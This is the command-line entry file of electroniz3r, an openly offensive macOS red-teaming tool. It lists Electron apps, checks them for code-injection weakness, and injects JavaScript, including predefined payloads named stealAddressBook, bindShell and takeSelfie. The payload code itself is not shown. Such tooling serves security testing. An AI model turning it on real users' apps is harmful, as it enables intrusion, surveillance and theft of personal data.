//
//  main.swift
//  electroniz3r
//
//  Created by Wojciech Reguła on 16/01/2023.
//

import Foundation
import ArgumentParser

@main
struct Electroniz3r: ParsableCommand {
    static let configuration = CommandConfiguration(abstract: "macOS Red Teaming tool that allows code injection in Electron apps\n by Wojciech Reguła (@_r3ggi)", subcommands: [ListApps.self, Inject.self, Verify.self])
}

extension Electroniz3r {
    
    struct ListApps: ParsableCommand {
        static let configuration = CommandConfiguration(abstract: "List all installed Electron apps")
        
        func run() throws {
            prettyPrintElectronApps()
        }
    }
    
    struct Inject: ParsableCommand {
        static let configuration = CommandConfiguration(abstract: "Inject code to a vulnerable Electron app")
        @Argument(help: "Path to the Electron app")
        var path: String
        
        @Option(help: "Path to a file containing JavaScript code to be executed")
        var pathJS: String?
        
        @Option(help: "Use predefined JS scripts (calc, screenshot, stealAddressBook, bindShell, takeSelfie)")
        var predefinedScript: PredefinedScripts?
        
        func validate() throws {
            let url = URL(filePath: path)
            let isResourceRechable: Bool = try url.checkResourceIsReachable()
            guard isResourceRechable else {
                throw ValidationError("The provided path is not reachable".red)
            }
            
            if let pathJS = pathJS {
                let urlJS = URL(filePath: pathJS)
                let isResourceRechableJS: Bool = try urlJS.checkResourceIsReachable()
                guard isResourceRechableJS else {
                    throw ValidationError("The provided path to JavaScript file is not reachable".red)
                }
            }
            
            if predefinedScript == nil && pathJS == nil {
                throw ValidationError("No --path-js/--predefined-script set".red)
            }
            
            
            if predefinedScript != nil && pathJS != nil {
                throw ValidationError("Both --path-js/--predefined-script set. Use only 1 of them".red)
            }
        }
        
        
        func run() throws {
            if isVulnerable(path: path) {
                if canLoadWebSocketDebuggerUrl() {
                    
                    if let pathJS = pathJS {
                        do {
                            let code = try String(contentsOfFile: pathJS)
                            executeCode(code: code)
                        } catch {
                            throw ValidationError("Error: \(error)")
                        }
                    }
                    
                    if let predefinedScript = predefinedScript {
                        executeCode(code: getCommandForPredefinedScript(script: predefinedScript))
                    }
                    
                }
            }
        }
    }
    
    struct Verify: ParsableCommand {
        static let configuration = CommandConfiguration(abstract: "Verify if an Electron app is vulnerable to code injection")
        
        @Argument(help: "Path to the Electron app")
        var path: String
        
        func validate() throws {
            let url = URL(filePath: path)
            let isResourceRechable: Bool = try url.checkResourceIsReachable()
            guard isResourceRechable else {
                throw ValidationError("The provided path is not reachable".red)
            }
        }
        
        func run() throws {
                let isVulnerable = isVulnerable(path: path)
                if isVulnerable {
                    print("The application is vulnerable!".green)
                    print("You can now kill the app using `kill -9 \(ElectronAppSingleton.shared.pid    )`")
                } else {
                    print("The application is NOT vulnerable")
                }
        }
        
    }
    
}
